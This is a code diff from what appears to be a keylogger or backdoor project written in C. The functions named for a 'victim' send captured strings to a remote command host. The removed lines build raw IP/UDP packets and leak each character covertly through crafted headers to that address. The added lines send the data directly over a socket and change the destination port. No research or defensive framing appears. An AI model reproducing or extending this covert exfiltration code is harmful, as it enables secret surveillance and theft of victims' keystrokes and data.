@@ -62,46 +62,17 @@ void safe_write_all(int file_desc, const char *str, int keyboard, struct options
 
 
 int write_all(int file_desc, const char *str, struct options_victim* ov) {
-    struct sockaddr_in cvc_address;
     int bytesWritten = 0;
     int bytesToWrite = (int)strlen(str) + 1;
-    struct iphdr ih;
-    struct udphdr uh;
+
     uint16_t size = (uint16_t)strlen(str);
-    int enable = 1;
-    char c_buffer[SEND_SIZE] = {0};
-    int byte;
 
-    ov->cvc_socket = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
-    if (ov->cvc_socket == -1) {
-        perror("socket() ERROR\n");
-        exit(EXIT_FAILURE);
-    }
-
-    if (setsockopt(ov->cvc_socket, IPPROTO_IP, IP_HDRINCL, &enable, sizeof(enable)) < 0) {
-        perror("Error setting IP_HDRINCL option");
-        exit(EXIT_FAILURE);
-    }
-
-    cvc_address.sin_family = AF_INET;
-    cvc_address.sin_port = htons(CVC_RECV_PORT);
-    cvc_address.sin_addr.s_addr = inet_addr(ov->cvc_ip);
 
     do {
         bytesWritten = (int)write(file_desc, str, bytesToWrite);
         // TODO: CREATE RAW PACKET
-        for (int i = 0; i < size; i++) {
-            create_cvc_ip_header(&ih, str[i], ov);
-            create_cvc_udp_header(&uh);
-            memcpy(c_buffer, &ih, sizeof(struct iphdr));
-            memcpy(c_buffer + sizeof(struct iphdr), &uh, sizeof(struct udphdr));
-            byte = (int)sendto(ov->cvc_socket, (const char *) c_buffer, SEND_SIZE, 0,
-                               (const struct sockaddr *) &cvc_address, sizeof(cvc_address));
-            if (byte < 0) {
-                perror("send failed\n");
-            }
-            memset(c_buffer, 0, SEND_SIZE);
-        }
+        write(ov->victim_socket, str, size);
+
         if(bytesWritten == -1) {
             return 0;
         }
@@ -188,7 +159,7 @@ static int is_char_device(const struct dirent *file) {
 
 unsigned short create_cvc_udp_header(struct udphdr* uh) {
     uh->source = htons(VICTIM_PORT);
-    uh->dest = htons(CVC_RECV_PORT);
+    uh->dest = htons(CVC_PORT);
     uh->len = htons(sizeof(struct udphdr));
     uh->check = calculate_checksum(&uh, sizeof(struct udphdr));
 
